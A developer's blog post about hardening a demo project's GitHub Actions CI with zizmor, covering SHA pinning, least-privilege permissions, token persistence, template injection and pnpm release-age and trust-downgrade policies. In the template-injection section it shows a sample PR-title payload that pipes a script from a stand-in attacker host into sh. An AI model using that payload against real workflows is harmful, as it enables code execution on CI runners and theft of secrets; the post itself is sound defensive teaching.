---
title: I Spun Up a New Project and Used zizmor to Plug Its CI Holes One by One
date: 2026-11-04
tags: [security, devops, ci-cd]
description: Applying the lessons of the LiteLLM incident to a brand-new Vite + React + TypeScript project — set up CI the way I usually do, let zizmor find the problems, then fix them one at a time. SHA pinning, least privilege, persist-credentials, template injection, plus hands-on tests of pnpm's minimumReleaseAge and trustPolicy.
---

## Done judging others — time to audit my own habits

In the [last post](/blog/2026-11-03-litellm-unrevoked-key-supply-chain) I took apart the LiteLLM attack chain, and it all sounded very wise. Once I finished, though, I got a little uneasy: **how secure is the CI I usually set up, really?**

So for this post I ran an experiment. I spun up a brand-new Vite + React + TypeScript project called `pulse-board` (a fake engineering-metrics dashboard) and set up its CI **exactly the way I usually do**:

- **Visual Tests**: a gate job first decides whether to run at all (a push to `main`, changes to UI-related files, or a PR carrying the `needs-visual-check` label). If it should run, it builds, starts a preview server, and uses Playwright to take screenshots and send them to Argos for visual regression testing
- **Security Scan**: static security scanning with Bearer — PRs scan only the diff, pushes to `main` scan everything

All of it is pieced together from official examples. It works, and it looks perfectly normal. Next, I ran the tools over it to see how many holes a "normal" CI really has.

Every scan result and every error message in this post was actually produced by running against this demo project.

## Step one: scan first, don't guess

I used two tools:

- **[zizmor](https://docs.zizmor.sh/)**: a static analyzer built specifically to catch GitHub Actions security problems. It's written in Rust and installs fast
- **[actionlint](https://github.com/rhysd/actionlint)**: catches workflow syntax errors and expression type errors, and if you have shellcheck installed it even checks the shell scripts inside `run:`

```bash
pip install zizmor        # the real install method comes later; this is just to get it running
go install github.com/rhysd/actionlint/cmd/actionlint@v1.7.12

actionlint                       # syntax check
zizmor --offline .github/        # default mode
zizmor --offline --persona=pedantic .github/   # nitpicky mode
```

actionlint (with shellcheck) found nothing, which didn't surprise me — a workflow that runs usually has valid syntax. zizmor's results, on the other hand, were not pretty:

| Rule | Count | Severity | In plain English |
|---|---|---|---|
| `unpinned-uses` | 6 | high | actions use a tag (`@v6`) instead of a commit SHA |
| `excessive-permissions` | 1 | high | `id-token: write` is granted at the whole-workflow level |
| `artipacked` | 3 | low | checkout leaves the token on the runner |
| `template-injection` | 4 | pedantic | `${{ }}` written straight into a shell script |
| `anonymous-definition` | 3 | pedantic | jobs have no `name` |

A freshly created project with two workflows written from the examples, and there are already 17 findings. Let's take them one at a time.

## Problem one: `@v6` isn't the `@v6` you think it is

The original looked like this:

```yaml
- uses: actions/checkout@v6
- uses: pnpm/action-setup@v6
- uses: actions/setup-node@v6
- uses: bearer/bearer-action@v2
```

Looks perfectly normal, right? The official docs write it this way too.

The problem is that **git tags can move**. `v6` is just a pointer, and the maintainer (or whoever steals the maintainer's account) can repoint it at a different commit whenever they like. The next time your workflow runs, GitHub will dutifully fetch that new commit and run it, and you'll never know.

This isn't theoretical. That's exactly what happened in the `tj-actions/changed-files` incident in March 2025: the attacker repointed nearly every version tag at a malicious commit that printed secrets from runner memory into the logs. For public repos using the action, those secrets ended up sitting right there in public Actions logs.

The fix is to use a **commit SHA** instead, because a SHA is a hash of the content and can't be changed.

### How do you look up the SHA? Watch out for annotated tags

```bash
git ls-remote --tags https://github.com/actions/checkout.git | grep -E 'v6\.1\.0'
# d23441a48e516b6c34aea4fa41551a30e30af803  refs/tags/v6.1.0
```

There's a small trap here: if the tag is an **annotated tag**, `ls-remote` lists two lines — one is the SHA of the tag object itself, and the one ending in `^{}` is the actual commit SHA. `uses:` needs the commit:

```text
9f698171ed81b15d1823a05fc7211befd50c8ae0  refs/tags/v6.0.3      ← tag object, don't use this
df4cb1c069e1874edd31b4311f1884172cec0e10  refs/tags/v6.0.3^{}   ← commit, use this
```

I wrote a small one-liner to find out which version `v6` currently points to:

```bash
repo=actions/checkout; major=v6
out=$(git ls-remote --tags https://github.com/$repo.git)
commit_of() {  # prefer ^{} (the commit an annotated tag points to)
  local p=$(echo "$out" | awk -v t="refs/tags/$1^{}" '$2==t{print $1}')
  [ -n "$p" ] && echo "$p" || echo "$out" | awk -v t="refs/tags/$1" '$2==t{print $1}'
}
m=$(commit_of $major); echo "$major -> $m"
echo "$out" | awk '{print $2}' | sed 's#refs/tags/##; s#\^{}##' | sort -u \
  | grep -E "^$major\.[0-9]+(\.[0-9]+)?$" \
  | while read t; do [ "$(commit_of $t)" = "$m" ] && echo "  = $t"; done
# v6 -> d23441a48e516b6c34aea4fa41551a30e30af803
#   = v6.1.0
```

After the change it looks like this; the trailing comment is the version number, for humans:

```yaml
- uses: actions/checkout@d23441a48e516b6c34aea4fa41551a30e30af803 # v6.1.0
- uses: pnpm/action-setup@73e46992e05b19abd31f2f3c20e0e7370d762115 # v6.1.1
- uses: actions/setup-node@249970729cb0ef3589644e2896645e5dc5ba9c38 # v6.5.0
- uses: bearer/bearer-action@828eeb928ce2f4a7ca5ed57fb8b59508cb8c79bc # v2
```

### Doesn't that mean the SHA never gets updated?

Right, which is why you pair it with Dependabot. It understands the `@<sha> # v6.1.0` format, and when a new version comes out it opens a PR that updates both the SHA and the comment:

```yaml
# .github/dependabot.yml
version: 2
updates:
  # automatically open PRs to update actions pinned by commit SHA in workflows (along with the # vX.Y.Z comment)
  - package-ecosystem: github-actions
    directory: /
    schedule:
      interval: weekly
    # wait at least 7 days after a new version is published before opening a PR, to dodge the "poisoned right after release" window
    cooldown:
      default-days: 7
    groups:
      github-actions:
        patterns: ["*"]
```

`cooldown` is, to me, the most important line. LiteLLM's malicious version lived for only two hours, and the tj-actions malicious commit was caught within days too. **Let someone else step on the landmine first** — it sounds selfish, but in supply chain security it's a very practical strategy.

## SHA pinning isn't a silver bullet (part 1): actions download more stuff at runtime

After switching to SHAs, I took a peek at what `bearer-action` actually does. Here's its `action.yml`:

```yaml
runs:
  using: "composite"
  steps:
    - shell: bash
      run: |
        VERSION="${{ inputs.version }}"
        ...
        curl -sfL https://raw.githubusercontent.com/Bearer/bearer/main/contrib/install.sh | sh -s -- -b "$RUNNER_TEMP" "$VERSION"
```

Hmm… I've locked the action to a specific SHA, but the moment it runs it fetches install.sh from the **`main` branch** and executes it, and since I hadn't specified a `version`, install.sh downloads the **latest** Bearer CLI.

In other words, all I'd locked was the shell; the program that actually runs inside was still floating.

install.sh does verify a checksum, but the checksum file and the binary come from **the same release**. That protects against a file getting corrupted in transit, but not against the release itself being swapped out: anyone who can publish a malicious release can of course publish a matching checksum. It's the same lesson as "the signature was real" from the LiteLLM post.

The least I can do is pin the CLI version:

```yaml
- name: Run Bearer SAST
  uses: bearer/bearer-action@828eeb928ce2f4a7ca5ed57fb8b59508cb8c79bc # v2
  with:
    # the action itself is pinned by SHA, but at runtime it downloads the Bearer CLI;
    # without a version it grabs the "latest", so pin it here too
    version: "2.1.3"
    diff: ${{ github.event_name == 'pull_request' }}
    exit-code: "1"
```

I can't change the fact that `install.sh` is downloaded from `main` short of forking the action or writing my own download step. That's a known, accepted residual risk. **After SHA pinning, remember to open the action's source and see what else it pulls in.**

## SHA pinning isn't a silver bullet (part 2): commits from forks resolve too

Remember that detail from the last post? The LiteLLM attacker created a fork under the lookalike org `Berri-AI`, yet that fork's commit also opened at `github.com/BerriAI/litellm/commit/20535d8f`, because GitHub lets forks and the original repo share git objects.

That's a hole in SHA pinning too. In theory, someone could send you a PR that changes `uses: actions/checkout@<sha>` to a **malicious commit living in a fork**. Because `actions/checkout@<that SHA>` really does resolve, the reviewer just sees one 40-character hash replaced by another, which is very hard to spot. zizmor has an `impostor-commit` check specifically for this (it needs online mode).

That's one of the reasons GitHub introduced lockfiles.

## A better approach: Actions workflow lockfiles

GitHub launched Actions workflow lockfiles in public preview on October 14 and made them GA on October 28. The concept is the same as `composer.lock` or `pnpm-lock.yaml`: `gh actions-lock` generates `.github/workflows/actions.lock`, recording which commit each action (**including the other actions that action uses internally**) resolved to.

```yaml
# .github/workflows/actions.lock (example from the official docs)
version: 'v0.0.3'
workflows:
    '.github/workflows/ci.yml':
        - 'octo-org/deploy-action@v3.1.0'
dependencies:
    'octo-org/deploy-action@v3.1.0':
        ref: 'v3.1.0'
        commit: 'sha1-...'
        owner_id: 44036562
        repo_id: 197814629
```

It beats manual SHA pinning in three ways:

1. **It locks transitive dependencies too**: manual pinning only reaches the layer you wrote yourself
2. **It records `owner_id` / `repo_id`**: even if a repo is deleted and someone squats a repo with the same name, the numeric IDs won't match
3. **It checks that the commit is reachable from the recorded tag or branch**: commits from forks are rejected, which plugs exactly the impostor-commit hole above

And the runner enforces it at execution time — it isn't just a lint. Usage:

```bash
gh extension install github/gh-actions-lock
gh actions-lock              # generate or fix actions.lock
git add .github/workflows/
gh actions-lock --verify     # put this in CI so nobody commits a broken lockfile
```

To be honest about its limitations, though (from the official README):

- Calls to **reusable workflows in other repos** (`jobs.<id>.uses`) aren't locked
- **Container images** aren't locked; anything without an `@sha256:` digest only gets a warning
- Local actions in the same repo (`./...`) aren't tracked
- The tool is still pre-1.0

`gh actions-lock` needs a logged-in `gh` CLI, and it needs a repo on GitHub to verify against. My demo project only lives on my machine, so this post sticks with manual SHA pinning. The official docs also say that once you adopt a lockfile, you no longer strictly need SHAs in the workflow files.

## Problem two: too many permissions

The original `visual-tests.yml`:

```yaml
permissions:
  contents: read
  id-token: write # Argos uses GitHub OIDC to verify the uploader's identity
```

`id-token: write` lets a job ask GitHub for an **OIDC token** proving "I am this workflow in this repo." Argos uses it to verify who's uploading, with no separate API key to manage — which is a good thing.

The problem is that I'd granted it to the **entire workflow**, so even the `changes` job, whose only job is deciding "should we run," could get one. An OIDC token can be exchanged for credentials with cloud services: if I ever set up AWS or GCP to trust this repo, any single compromised job could trade an OIDC token for cloud permissions.

The fix is to turn everything off at the top level and let each job grant itself what it needs:

```yaml
# grant no permissions by default; each job opens only what it needs (principle of least privilege)
permissions: {}

jobs:
  changes:
    permissions:
      contents: read
    # ...

  visual:
    permissions:
      contents: read
      id-token: write # Argos uses GitHub OIDC; only this job needs it
```

It's the same idea as Laravel Policies: deny by default, then explicitly grant what's needed.

## Problem three: checkout leaves the token on the runner

By default, `actions/checkout` saves the `GITHUB_TOKEN` so you can `git push` later. Since v6 it stores it in a separate file under `$RUNNER_TEMP` instead of writing it straight into `.git/config`, but wherever it lives, **every later step in the same job can read it**.

Why is that dangerous? Think about what the `visual` job does next: `pnpm install`. If any dependency ships a malicious install script, it can dig that token out.

Neither workflow ever needs to push, so I just turned it off:

```yaml
- uses: actions/checkout@d23441a48e516b6c34aea4fa41551a30e30af803 # v6.1.0
  with:
    persist-credentials: false # don't leave GITHUB_TOKEN on the runner
```

## Problem four: `${{ }}` is string substitution, not a variable

The gate job originally looked like this:

```yaml
- id: filter
  run: |
    if [ "${{ github.event_name }}" = "push" ] \
       || [ "${{ contains(github.event.pull_request.labels.*.name, 'needs-visual-check') }}" = "true" ]; then
      echo "ui=true" >> "$GITHUB_OUTPUT"; exit 0
    fi
    changed=$(git diff --name-only \
      "${{ github.event.pull_request.base.sha }}" \
      "${{ github.event.pull_request.head.sha }}")
```

A lot of people assume `${{ }}` works like PHP's `{$var}` interpolation, but it's actually more like Blade's `{!! !!}`: **GitHub pastes the value verbatim into the script before the shell runs**, with no escaping at all.

If what gets pasted in is something an attacker controls — a PR title, an issue body, a branch name — you've got a shell injection:

```yaml
# ❌ classic mistake: a PR titled  a"; curl https://evil.example/x | sh; echo "
- run: echo "Title: ${{ github.event.pull_request.title }}"
```

Here, there's no direct danger: the event name, SHAs and booleans aren't strings an outsider can freely control, which is why zizmor only flags them in pedantic mode. But habits matter — copy-paste this one day and swap in the PR title, and you're done. The right way is to **put the values in `env:` first, and only use shell variables in the script**:

```yaml
- id: filter
  # always route ${{ }} through env first and only use shell variables in the script, to avoid template injection
  env:
    EVENT_NAME: ${{ github.event_name }}
    HAS_LABEL: ${{ contains(github.event.pull_request.labels.*.name, 'needs-visual-check') }}
    BASE_SHA: ${{ github.event.pull_request.base.sha }}
    HEAD_SHA: ${{ github.event.pull_request.head.sha }}
  run: |
    if [ "$EVENT_NAME" = "push" ] || [ "$HAS_LABEL" = "true" ]; then
      echo "ui=true" >> "$GITHUB_OUTPUT"; exit 0
    fi
    changed=$(git diff --name-only "$BASE_SHA" "$HEAD_SHA")
```

Passed in through environment variables, the values are just data; the shell won't parse them as code. It's the prepared statement idea, applied to the shell.

## Deliberately left unfixed: `anonymous-definition`

Pedantic mode still reports 3 "job has no `name`" findings, and I deliberately left them alone.

The reason is that GitHub's status check names come from the job id or name. If you've made a check required in branch protection and later rename it, the rule no longer matches the new name, and PRs may get stuck or skip the check entirely. For a new project that doesn't have branch protection yet, picking good names from the start is best; for a project that's already live, you have to change the protection rules along with it. **A tool's suggestions are input, not gospel** — think each one through before changing anything.

## Problem five: the dependencies themselves

With the workflows fixed, the thing in CI that actually runs the most third-party code is `pnpm install`.

### `--frozen-lockfile`

```yaml
- name: Install dependencies
  # --frozen-lockfile: fail if the lockfile and package.json disagree, instead of quietly resolving new versions
  run: pnpm install --frozen-lockfile
```

pnpm actually defaults to frozen in CI environments, but spelling it out is clearer and protects you if the default ever changes. It's the same reasoning as running `composer install` rather than `composer update`.

### pnpm 12's two supply chain policies

While reading through pnpm 12's changelog I found that it **already has a built-in 1-day `minimumReleaseAge`**, but in "lenient mode": versions that are too new get automatically added to the exclusion list instead of being blocked. It only becomes strict once you set the value explicitly.

```yaml
# pnpm-workspace.yaml
# only install versions published more than 3 days ago (in minutes). Setting it explicitly makes it strict: too-new versions fail outright
minimumReleaseAge: 4320
# reject a package if its publishing method "downgrades" compared to older versions (e.g. from trusted publishing to a plain token)
trustPolicy: no-downgrade
```

The logic behind `trustPolicy: no-downgrade`: if every earlier version of a package was published through CI with trusted publishing (with provenance), and suddenly one version is published with a personal token from someone's laptop, the account has quite possibly been compromised. That's been a classic signature in several of the large npm worm incidents.

## And the policy blocked something right away

I'd installed `pulse-board`'s packages one by one with `pnpm add`, using pnpm's default settings at the time. After adding the policies above, I ran the same command CI would:

```bash
rm -rf node_modules && pnpm install --frozen-lockfile
```

```text
  × installing dependencies
  ╰─▶ 2 lockfile entries failed verification:
        @vitejs/plugin-react@6.2.1 was published at 2026-11-02T09:15:06.000Z,
      within the minimumReleaseAge cutoff (2026-11-01T02:13:43.989Z)
        semver@7.8.6 was published at 2026-11-02T17:05:43.359Z, within the
      minimumReleaseAge cutoff (2026-11-01T02:13:43.989Z)
```

A brand-new project, less than two days after installing, and the lockfile already holds two "too new" packages.

- **`@vitejs/plugin-react@6.2.1`**: a direct dependency, Vite's React plugin
- **`semver@7.8.6`**: an indirect dependency, via `@argos-ci/playwright` → `@argos-ci/core` → `sharp` → `semver`

The plugin-react release history is interesting:

```bash
npm view @vitejs/plugin-react time --json
```

| Version | Published (UTC) |
|---|---|
| 6.1.2 | 10/05 |
| 6.2.0 | 11/02 07:47 |
| 6.2.1 | 11/02 09:18 |

6.2.1 followed 6.2.0 just **90 minutes** later. A hotfix landing right after a new release is very common, and that's another benefit of "wait a few days before using it": besides dodging malicious versions, you also dodge versions that were just released and are still having their bugs fixed.

### Trap one: the version range `pnpm add` writes

I assumed re-resolving as pnpm suggested would do it, but it still failed. The reason was in `package.json`:

```json
"@vitejs/plugin-react": "^6.2.1"
```

`pnpm add` writes **whatever version it installed at the time** as the floor of a caret range. `^6.2.1` means "at least 6.2.1," and 6.2.1 itself is too new, so under a 3-day limit there's simply no version to choose. You first have to lower the floor to a version that's old enough:

```json
"@vitejs/plugin-react": "^6.1.2"
```

### Trap two: a plain `pnpm install` verifies the old lockfile first

After editing `package.json`, running a plain `pnpm install` still gave the same error. pnpm checks the **existing lockfile** against the policies first, and if that check fails it stops — it never gets as far as re-resolving. As the error message suggests, you have to clear the lockfile first:

```bash
pnpm clean --lockfile
pnpm install
# + @vitejs/plugin-react 6.1.2
```

`semver` is an indirect dependency, so there was no need to touch `package.json`; pnpm automatically picked 7.8.5, which satisfies the policy. In the end, only these two versions changed in the lockfile:

```diff
-  '@vitejs/plugin-react@6.2.1':
+  '@vitejs/plugin-react@6.1.2':
-  semver@7.8.6:
+  semver@7.8.5:
```

Run the frozen install once more, and it passes:

```bash
rm -rf node_modules && pnpm install --frozen-lockfile
# Done in 61ms using pnpm v12.15.0
```

`pnpm clean --lockfile` re-resolves the whole thing, which in a large project may upgrade a bunch of other packages along the way. That's when you need to read the lockfile diff carefully — and it's why **the policy is best set up at the very start of a project**.

## What it looks like when `trustPolicy` fires

None of `pulse-board`'s dependencies triggered `trustPolicy`. But I wanted to see what it looks like when it actually blocks something, so I picked a recent real case that triggers it and tested it in an empty scratch project:

```bash
pnpm add seroval@1.7.2
```

```text
  ╰─▶ Failed to resolve dependency: High-risk trust downgrade for
      "seroval@1.7.2" (possible package takeover)
```

"Possible package takeover" — those words still make my heart race. When an alert like this shows up, the easiest move is to drop it into the exclusion list and move on, but then the policy is pointless. So I treated it as an exercise and actually looked into it.

### First, the release history

`seroval` is a data serialization package that quite a few frameworks use indirectly.

```bash
npm view seroval@1.7.1 --json   # look at dist.attestations and _npmUser
```

| Version | Published | Publisher | Provenance |
|---|---|---|---|
| 1.7.1 | 10/23 | GitHub Actions (trusted publishing) | ✅ |
| **1.7.2** | **10/24** | **Maintainer's personal account** | **❌** |
| 1.7.3 | 10/28 | GitHub Actions (trusted publishing) | ✅ |

Wedged between two CI-published versions, a version suddenly appears that was published manually from a personal account, with no provenance. That's exactly the pattern you'd see if an account were compromised.

### Then, compare the contents

I downloaded the tarballs of all three versions and compared them. **Download only, no install** — `--ignore-scripts` makes sure nothing gets executed:

```bash
for v in 1.7.1 1.7.2 1.7.3; do
  npm pack seroval@$v --ignore-scripts
  mkdir $v && tar -xzf seroval-$v.tgz -C $v
done

diff -r 1.7.1/package 1.7.2/package
```

The result:

```diff
diff -r 1.7.1/package/dist/index.js 1.7.2/package/dist/index.js
1692c1692
< 	if (ctx.base.pending && value instanceof Promise) value.catch(ignoreRejection);
---
> 	if (value instanceof Promise) value.catch(ignoreRejection);
diff -r 1.7.1/package/package.json 1.7.2/package/package.json
5c5
<   "version": "1.7.1",
---
>   "version": "1.7.2",
```

(The other three build files under `dist/` have the same one-line change.) It's a single-line bug fix: handling an uncaught Promise rejection. No new files, no install script, no network requests.

Now compare 1.7.2 with 1.7.3:

```diff
diff -r 1.7.2/package/package.json 1.7.3/package/package.json
5c5
<   "version": "1.7.2",
---
>   "version": "1.7.3",
```

Apart from the version number, **not a single byte differs**. The reasonable conclusion: the maintainer first published a hotfix by hand from their own machine, then a few days later published it properly through CI. Not a takeover.

### The answer isn't "let it through" — it's "upgrade"

Since the later versions have normal provenance, there's no reason to stay on the suspicious one. If 1.7.2 is in your lockfile, the right move is to upgrade:

```bash
pnpm update seroval --depth Infinity
```

pnpm will pick a version that's old enough and has provenance, within the policy limits.

So when *should* you add an exception? When you've confirmed it's legitimate **and there's no better version to upgrade to**. A well-known example is `semver@6.3.1`: a backport the maintainer published by hand in 2023 to fix a ReDoS vulnerability (CVE-2022-25883). By then, 7.x had already moved to CI publishing with provenance, so this one also gets flagged as a "downgrade." In a case like that, add it to the exclusions **and write down the reason and the condition for removing it**:

```yaml
# exceptions allowed only after manual review; every entry must say why
trustPolicyExclude:
  # ReDoS fix backport (CVE-2022-25883) published by hand by the maintainer in 2023-07, without provenance.
  # If a fixed version with trusted publishing appears and passes minimumReleaseAge, upgrade and remove this line
  - semver@6.3.1
```

This was my biggest takeaway this time: **security policies produce alerts that need a human to judge them**. At that point the most dangerous thing isn't the alert itself — it's adding an exception without thinking, just to turn CI green.

By the way, on 10/20 GitHub also launched an npm **package firewall** in public preview, which can apply similar cooldown and attestation-downgrade checks at the organization level. For now, though, it's only available to GitHub Enterprise Cloud. For personal projects, these two pnpm settings are a free and effective alternative.

## Keeping the checks going: workflow-audit.yml

Scanning by hand once feels great, but the next time someone (usually me, three months from now) adds a workflow, will they remember? So I added one more workflow that runs automatically whenever anything under `.github/` changes:

```yaml
name: Workflow Audit

on:
  push:
    branches: [main]
    paths:
      - ".github/**"
  pull_request:
    paths:
      - ".github/**"

permissions: {}

jobs:
  audit:
    name: zizmor + actionlint
    runs-on: ubuntu-latest
    permissions:
      contents: read
    steps:
      - uses: actions/checkout@d23441a48e516b6c34aea4fa41551a30e30af803 # v6.1.0
        with:
          persist-credentials: false

      # the runner's system Python is protected by PEP 668, so install into a separate venv
      - name: Install zizmor
        run: |
          python3 -m venv "$RUNNER_TEMP/audit-venv"
          "$RUNNER_TEMP/audit-venv/bin/pip" install --require-hashes -r .github/workflow-audit-requirements.txt

      - name: Run zizmor
        env:
          # let zizmor read public repo APIs (to check impostor commits and actions with known vulnerabilities)
          GH_TOKEN: ${{ github.token }}
        run: |
          "$RUNNER_TEMP/audit-venv/bin/zizmor" --format=github .github/

      # go install verifies module contents against sum.golang.org, which amounts to built-in hash pinning
      - name: Run actionlint
        run: |
          go install github.com/rhysd/actionlint/cmd/actionlint@v1.7.12
          "$(go env GOPATH)/bin/actionlint" -color
```

Two details here are worth calling out.

**First, even the checking tools themselves get pinned**. zizmor is installed from PyPI using `--require-hashes` from the [last post](/blog/2026-11-03-litellm-unrevoked-key-supply-chain):

```text
# .github/workflow-audit-requirements.txt
zizmor==1.31.1 \
    --hash=sha256:58e878eb2dbd2c6183c105e1ac28c14f7dd1eca44a783f1fe2a69647d012c410 \
    --hash=sha256:d9b36840c560a8abe39d9ef3d077239aabf6d572c5c2b629c970592a617dbf6f
```

I nearly contradicted myself here: at first I grabbed the latest zizmor, 1.32.0, and only when I looked up the hashes did I notice it had been uploaded **the day before**. I'd just finished saying "wait 7 days on new versions," and I was about to break that rule immediately. So I went back to 1.31.1, published on 10/15.

**Second, Go's module system has a built-in line of defense**. Modules downloaded by `go install ...@v1.7.12` are checked against `sum.golang.org`, a public transparency log. Even if someone republishes the same version number, different content gets rejected. This is something I found beautifully designed while learning Go: lockfiles in npm, pnpm and Composer do record hashes, but only "after the first download"; Go checks even the very first download against a public record shared by the whole world, and it's on by default.

## Before and after

| | Before | After |
|---|---|---|
| zizmor (default) | 10 findings (7 high) | **0** |
| zizmor (pedantic) | 17 | 3 (job names deliberately kept) |
| actionlint + shellcheck | 0 | 0 |
| Action versions | floating tags | commit SHA + Dependabot (7-day cooldown) |
| Bearer CLI | latest on every run | pinned to 2.1.3 |
| `id-token: write` | whole workflow | `visual` job only |
| Package policies | pnpm defaults (1 day, lenient) | 3 days strict + trust-downgrade check |

## Bonus: a CI template for Laravel + Vite projects

Finally, here are the same principles applied to the project PHP developers know best: Laravel. This template **passes actionlint and zizmor (0 findings)**, but I haven't run it on a real Laravel project, so treat it as a starting point and adapt it to yours:

```yaml
name: CI

on:
  push:
    branches: [main]
  pull_request:

permissions: {}

concurrency:
  group: ${{ github.workflow }}-${{ github.head_ref || github.ref }}
  cancel-in-progress: true

jobs:
  test:
    runs-on: ubuntu-latest
    permissions:
      contents: read
    steps:
      - uses: actions/checkout@d23441a48e516b6c34aea4fa41551a30e30af803 # v6.1.0
        with:
          persist-credentials: false

      - uses: shivammathur/setup-php@eb7c497e18156a6bbabfef1d3a82760b9eda3962 # 2.40.0
        with:
          php-version: "8.4"
          coverage: none

      - uses: actions/setup-node@249970729cb0ef3589644e2896645e5dc5ba9c38 # v6.5.0
        with:
          node-version: 22

      # Composer installs strictly from composer.lock. Dependencies' scripts never run anyway;
      # what executes code is plugins: only those listed in composer.json's allow-plugins get loaded (Composer 2.2+)
      - name: Install PHP dependencies
        run: composer install --no-interaction --prefer-dist --no-progress

      - name: Audit PHP dependencies
        run: composer audit --locked

      # npm ci: strictly follows package-lock.json; --ignore-scripts: run no package install scripts
      - name: Install JS dependencies
        run: npm ci --ignore-scripts

      - name: Audit JS dependencies
        run: npm audit --audit-level=high

      - name: Build assets
        run: npm run build

      - name: Run tests
        run: php artisan test
```

A few points PHP developers tend to miss:

- **Composer doesn't run dependencies' `scripts`**; it only runs the root project's (your own `composer.json`). What actually executes third-party code at install time is **plugins**, so take the `allow-plugins` allowlist seriously. If you use Pest, `pestphp/pest-plugin` is one plugin you'll need to allow.
- **`npm ci --ignore-scripts`** blocks every install script. Most of the Vite ecosystem doesn't need them; if you hit a package that genuinely needs a build step (`sharp`, for example), allow it individually with `npm rebuild <package-name>`.
- If your frontend uses pnpm instead, just reuse the `minimumReleaseAge` and `trustPolicy` settings above; pnpm also only lets allowlisted packages run build scripts by default.

## What I didn't get to verify this time

Being upfront about it:

- **Actions lockfile**: needs a logged-in `gh` and a repo on GitHub; the demo project only lives locally, so I didn't do it this time
- **The workflows actually running on GitHub**: every workflow in this post was validated with actionlint and zizmor, and the pnpm policies were actually run, but the demo project was never pushed to GitHub, so the workflows themselves never ran on a real runner
- **`bearer-action` downloading install.sh from `main`**: a known residual risk

## Checklist

To wrap up, here's a checklist you can take straight to your own repo:

- [ ] Every `uses:` is a 40-character commit SHA with the version in a trailing comment (or switch to an Actions lockfile)
- [ ] Open each action's `action.yml`, see what else it downloads at runtime, and pin every version you can
- [ ] Dependabot (or Renovate) updates the SHAs, with a cooldown configured
- [ ] Top-level `permissions: {}` in each workflow, with each job opening only what it needs
- [ ] `actions/checkout` gets `persist-credentials: false` (unless you really need to push)
- [ ] No `${{ }}` directly inside `run:`; route everything through `env:`
- [ ] Package installs use strict lockfile mode (`--frozen-lockfile`, `npm ci`, `composer install`)
- [ ] A minimum release age is configured (pnpm `minimumReleaseAge`, pip `--uploaded-prior-to`, uv `--exclude-newer`), and **set up at the very start of the project**
- [ ] When a policy blocks a package, **investigate before letting it through**: upgrade if you can, and give every exception a reason and a removal condition
- [ ] A workflow continuously checks the workflows themselves with zizmor / actionlint

[The next post](/blog/2026-11-04-agents-md-hijack-defense) covers a different kind of "supply chain": not packages, but the Markdown files your AI coding agent reads.

## References

- [GitHub docs: Workflow dependency lockfiles](https://docs.github.com/en/actions/concepts/security/workflow-dependency-lockfiles)
- [GitHub Changelog: GitHub Actions workflow lockfiles in public preview](https://github.blog/changelog/2026-10-14-github-actions-workflow-lockfiles-in-public-preview/) (2026-10-14)
- [github/gh-actions-lock](https://github.com/github/gh-actions-lock)
- [GitHub Changelog: GitHub package firewall in public preview](https://github.blog/changelog/2026-10-20-github-package-firewall-in-public-preview) (2026-10-20)
- [zizmor docs](https://docs.zizmor.sh/)
- [actionlint](https://github.com/rhysd/actionlint)
- [actions/checkout v6 README](https://github.com/actions/checkout)
- [pnpm settings docs](https://pnpm.io/settings)
